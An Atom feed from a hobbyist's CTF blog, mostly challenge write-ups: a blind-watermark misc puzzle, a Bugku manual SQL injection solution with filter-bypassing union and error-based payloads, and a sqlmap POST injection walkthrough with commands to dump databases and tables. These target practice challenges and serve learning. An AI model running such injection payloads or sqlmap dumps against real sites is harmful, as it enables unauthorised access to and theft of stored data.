<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>R1ght0us&#39;s Blog</title>
  
  <subtitle>一个Hack小子的梦想</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://ssb6666.github.io/"/>
  <updated>2018-09-02T07:37:58.527Z</updated>
  <id>https://ssb6666.github.io/</id>
  
  <author>
    <name>R1ght0us</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>照片里的盲水印</title>
    <link href="https://ssb6666.github.io/2018/09/02/%E7%85%A7%E7%89%87%E9%87%8C%E7%9A%84%E7%9B%B2%E6%B0%B4%E5%8D%B0/"/>
    <id>https://ssb6666.github.io/2018/09/02/照片里的盲水印/</id>
    <published>2018-09-02T06:22:38.000Z</published>
    <updated>2018-09-02T07:37:58.527Z</updated>
    
    <content type="html"><![CDATA[<p>这个题是安恒月赛里面的一道misc类型的题，在CTF中misc所谓最考验你的脑洞和检验你的<del>赛事水平</del>（赛棍？？？）<br><img src="/2018/09/02/照片里的盲水印/1.jpg" height="150px" width="150px"><br>但是这个方面还是要看一下，就当做开发脑力了。</p><p><strong>题目：暴力可解</strong><br><a href="https://pan.baidu.com/s/1GI9TlX3PtytDs0g6w-s3PQ" target="_blank" rel="noopener">题目文件</a><br>下载下来题目，打开压缩包解压发现有密码，猜测压缩包伪加密，使用010editor发现并没有伪加密，联系题目使用暴力破解，基本CTF所有让你暴力破解都是<strong>纯数字类型</strong>。<br><img src="/2018/09/02/照片里的盲水印/2.jpg" alt="暴力破解"><br>获得密码，解压得到两张相同的图片。<br><img src="/2018/09/02/照片里的盲水印/3.png" alt="解压所得图片"><br>在misc中，两张相同的图片基本上都应该是<strong>盲水印</strong>，所以使用bwm脚本（python2）。bwm脚本的<a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="noopener">github</a><br>运行脚本发现没有cv2这个模块，使用下面的命令安装cv2<br><code>pip install opencv-python</code><br>然后运行<code>python bwm.py decode 1.png 2.png flag.png</code>。其中1.png和2.png是解压所得图片，flag.png是所分离出来的水印。下图即为水印。<br><img src="/2018/09/02/照片里的盲水印/4.png" alt="flag"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个题是安恒月赛里面的一道misc类型的题，在CTF中misc所谓最考验你的脑洞和检验你的&lt;del&gt;赛事水平&lt;/del&gt;（赛棍？？？）&lt;br&gt;&lt;img src=&quot;/2018/09/02/照片里的盲水印/1.jpg&quot; height=&quot;150px&quot; width=&quot;150px&quot;&gt;
      
    
    </summary>
    
      <category term="CTF" scheme="https://ssb6666.github.io/categories/CTF/"/>
    
    
      <category term="MISC" scheme="https://ssb6666.github.io/tags/MISC/"/>
    
      <category term="盲水印" scheme="https://ssb6666.github.io/tags/%E7%9B%B2%E6%B0%B4%E5%8D%B0/"/>
    
  </entry>
  
  <entry>
    <title>SQL报错注入</title>
    <link href="https://ssb6666.github.io/2018/08/17/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <id>https://ssb6666.github.io/2018/08/17/SQL报错注入/</id>
    <published>2018-08-17T06:55:49.000Z</published>
    <updated>2018-08-17T07:17:07.788Z</updated>
    
    <content type="html"><![CDATA[<p>快草了两个月的bugku-web类型的题，感觉基本web类型都有了一些大概的了解，当然比不上dalao的掌控雷电的操作，后面就是多玩一会python了，毕竟CTF中脚本不会写是真的硬伤。</p><p>这道题是web-150分的题，看了一下网上的WP不多，我也是找了一堆资料，看了看相似的体型才把这道题做的差不多。</p><p>题名：多次，<a href="http://120.24.86.145:9004/1ndex.php?id=1" target="_blank" rel="noopener">网址链接</a></p><p>首先打开网页看到id这个参数，很经典的SQL注入。于是测试单引号过滤<strong>?id=1’</strong>，页面发生变化，猜测位查询语句为单引号闭合。<br><img src="/2018/08/17/SQL报错注入/1.png" alt=""><br>再次进行测试，<strong>?id=1′ or 1=1%23 </strong>，发现并无变化。<br><img src="/2018/08/17/SQL报错注入/2.png" alt=""><br>猜测可能有WAF过滤，于是测试双重写or，<strong>?id=1′ oorr 1=1%23</strong> ，测试发现页面改变<br><img src="/2018/08/17/SQL报错注入/3.png" alt=""></p><p>进行测试过滤，使用异或符号（^）搭配length函数开始测试。</p><p><em>如何判断是否过滤，例如union函数没有过滤，那么length(‘union’)=0是不成立的，即该语句布尔值为0，并且前面的查询语句布尔值恒等于1，1^0=1，1^1=0。则为1返回正常页面，不正常返回错误页面。</em><br><img src="/2018/08/17/SQL报错注入/4.png" alt=""><br>经测试：or，and，union，select被过滤。那么接下来就是常规测试。</p><p><strong>?id=1%27 oorrder by 2%23</strong>，测试列数为2。（注意order里面的or）<br><img src="/2018/08/17/SQL报错注入/5.png" alt=""></p><h1 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h1><p>?id=-1%27 uniounionn selecselectt 1,group_concat(schema_name) from infoorrmation_schema.schemata%23（坑点：<strong>information里面的or</strong>）<br><img src="/2018/08/17/SQL报错注入/6.png" alt=""></p><h1 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h1><p>?id=-1%27 uniounionn selecselectt 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=0x776562313030322d31（十六进制码为web1002-1）%23<br><img src="/2018/08/17/SQL报错注入/7.png" alt=""></p><h1 id="爆出数据"><a href="#爆出数据" class="headerlink" title="爆出数据"></a>爆出数据</h1><p>?id=-1%27 uniounionn selecselectt 1,flag1 from flag1 %23<br><img src="/2018/08/17/SQL报错注入/8.png" alt=""><br>然后题目提示还有一个flag在下一关的地址。根据上面的操作，地址可能在address列里。</p><h1 id="寻找下一关地址"><a href="#寻找下一关地址" class="headerlink" title="寻找下一关地址"></a>寻找下一关地址</h1><p>?id=-1%27 uniounionn selecselectt 1,address from flag1 %23<br><img src="/2018/08/17/SQL报错注入/9.png" alt=""></p><h2 id="找到下一关地址"><a href="#找到下一关地址" class="headerlink" title="找到下一关地址"></a>找到下一关地址</h2><p><img src="/2018/08/17/SQL报错注入/10.png" alt=""><br>OK，还是向上面的一样测试，发现还是单引号过滤。<br><img src="/2018/08/17/SQL报错注入/11.png" alt=""><br>发现还是有回显我们测试的语句，突然发现这个WAF过滤的有点奇怪，这个过滤了union<br><img src="/2018/08/17/SQL报错注入/12.png" alt=""><br>那我将union重写，发现直接不回显，可能是后端的专门对这种产生过滤。<br><img src="/2018/08/17/SQL报错注入/13.PNG" alt=""><br>因为还发现有报错产生，那么我就进行报错盲注测试。</p><p>盲注测试公式：<strong>union select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x;</strong></p><p>其中<strong>version()</strong>改成相应的注入语句。公式需要灵活变通，例如本题中的union被过滤，那么将语句改为or and连接的形式，并且适当添加相应的列数。Ps：盲注相关原理在文章末尾链接。</p><p> <em>or (select 1 from(select count(</em>),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)<em>2))x from information_schema.schemata group by x)a)%23</em></p><p>因为不能用union进行注入，所以改变一下形式使用or，就这个走了好多弯路，因为or只能使用1个跟1个比，否则将会出错<strong>Operand should contain 1 column(s) </strong>, 且(select count(<em>),concat(0x23,(select schema_name from information_schema.schemata limit 1,1),0x23,floor(rand(0)</em>2))x from information_schema.schemata group by x)这条语句将会产生一个虚拟表，你在虚拟表进行查询时需要起一个别名，我在这里起的a，于是报错爆来数据库，下面的操作跟第一关一样。<br><img src="/2018/08/17/SQL报错注入/14.png" alt=""><br>但是其中爆数据时产生了一些问题，说是子查询返回超过了一行但是猜测肯定是只有一行的，估计是出题人加了回车产生了换行。<br><img src="/2018/08/17/SQL报错注入/15.png" alt=""><br>解决方法：left((select flag2 from flag2),40)，取前40个字符。<br><img src="/2018/08/17/SQL报错注入/16.png" alt=""></p><h2 id="相关链接："><a href="#相关链接：" class="headerlink" title="相关链接："></a>相关链接：</h2><p><a href="https://blog.csdn.net/qq_35544379/article/details/77453019" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/77453019</a></p><p><a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">https://blog.csdn.net/he_and/article/details/80455884</a></p><p><a href="http://wyb0.com/" target="_blank" rel="noopener">http://wyb0.com/</a></p><blockquote><p><strong>两天时间全部花费在这个报错注入上，不过懂了好多SQL上的东西，也算是少有收获。</strong></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;快草了两个月的bugku-web类型的题，感觉基本web类型都有了一些大概的了解，当然比不上dalao的掌控雷电的操作，后面就是多玩一会python了，毕竟CTF中脚本不会写是真的硬伤。&lt;/p&gt;
&lt;p&gt;这道题是web-150分的题，看了一下网上的WP不多，我也是找了一堆资料
      
    
    </summary>
    
      <category term="CTF" scheme="https://ssb6666.github.io/categories/CTF/"/>
    
    
      <category term="SQLinjection" scheme="https://ssb6666.github.io/tags/SQLinjection/"/>
    
      <category term="手动注入" scheme="https://ssb6666.github.io/tags/%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>SQLMAP-POST注入</title>
    <link href="https://ssb6666.github.io/2018/08/17/SQLMAP-POST%E6%B3%A8%E5%85%A5/"/>
    <id>https://ssb6666.github.io/2018/08/17/SQLMAP-POST注入/</id>
    <published>2018-08-17T05:11:14.000Z</published>
    <updated>2018-08-17T07:20:17.029Z</updated>
    
    <content type="html"><![CDATA[<p>BUGKU-ctf作为国内著名的ctf联系靶场，拥有丰富的题型加强我们的ctf水平。下面就是一次我认为比较典型的sql post注入题型。</p><p><center><strong>抓包，复制出来打成一个txt文件</strong></center><br><img src="/2018/08/17/SQLMAP-POST注入/1.png" alt="抓包内容"></p><p><center><strong>sqlmap -r test.txt -p admin_name –dbs</strong></center><br>因为博主懒的没有在win环境下下载sqlmap，使用kali中自带sqlmap工具。下面简单解释一下工具命令。<br><img src="/2018/08/17/SQLMAP-POST注入/2.png" alt=""></p><ul><li><p>-r  指定一个文件。</p></li><li><p>-p 指定参数，如图我指定提交表单中的admin_name作为参数进行注入。</p></li><li><p>–dbs 爆出所有的数据库。</p></li></ul><p>点击回车运行，竟然发现无法进行sql注入！</p><p><img src="/2018/08/17/SQLMAP-POST注入/3.png" alt=""><br>上图是我进行注入失败，后面继续追加了下面的参数</p><ul><li><p>-v  这个是展现攻击测试的详细过程的程度，一般设为3就足够。</p></li><li><p>–threads 这个见词知意，为线程数，博主一般将此设为10，这个根据每个人的电脑配置，酌情增加。</p></li></ul><center><strong>sqlmap -r test.txt -p admin_name –dbs –threads 10 -v 3 –level 3</strong></center><p><img src="/2018/08/17/SQLMAP-POST注入/4.PNG" alt=""><br>如图，发现这个SQL注入并不是平常的单引号闭合，而是双引号闭合，而sqlmap只有在level=3时才会测试双引号。</p><p>解释参数：</p><ul><li>–level 这个参数表示sqlmap进行测试的程度，数值为1~5，一般将其设为3，因为如果你给的数值越大，代表工具会变慢，很容易影响进度。<br><center><strong>sqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 –table</strong></center><br><center><strong>sqlmap -r test.txt -p admin_name -D bugkusql1 –threads 10 -v 3 –level 3 -T flag1 -C flag1 –dump</strong></center><br>这些就是爆表，爆字段，跟平常的sqlmap使用并无区别，因此不再做详细解释。</li></ul><p>解释参数：</p><ul><li><p>-D 指定数据库。</p></li><li><p>-T  指定表。</p></li><li><p>–table  数据库爆表名。</p></li><li><p>–dump 显示所有字段。</p></li></ul><hr><p><a href="http://120.24.86.145:9001/sql/" target="_blank" rel="noopener">题目地址</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;BUGKU-ctf作为国内著名的ctf联系靶场，拥有丰富的题型加强我们的ctf水平。下面就是一次我认为比较典型的sql post注入题型。&lt;/p&gt;
&lt;p&gt;&lt;center&gt;&lt;strong&gt;抓包，复制出来打成一个txt文件&lt;/strong&gt;&lt;/center&gt;&lt;br&gt;&lt;img s
      
    
    </summary>
    
      <category term="CTF" scheme="https://ssb6666.github.io/categories/CTF/"/>
    
    
      <category term="kali" scheme="https://ssb6666.github.io/tags/kali/"/>
    
      <category term="SQLinjection" scheme="https://ssb6666.github.io/tags/SQLinjection/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://ssb6666.github.io/2018/07/23/hello-world/"/>
    <id>https://ssb6666.github.io/2018/07/23/hello-world/</id>
    <published>2018-07-23T13:15:55.470Z</published>
    <updated>2018-08-15T03:44:54.785Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
      <category term="hexo" scheme="https://ssb6666.github.io/tags/hexo/"/>
    
  </entry>
  
</feed>
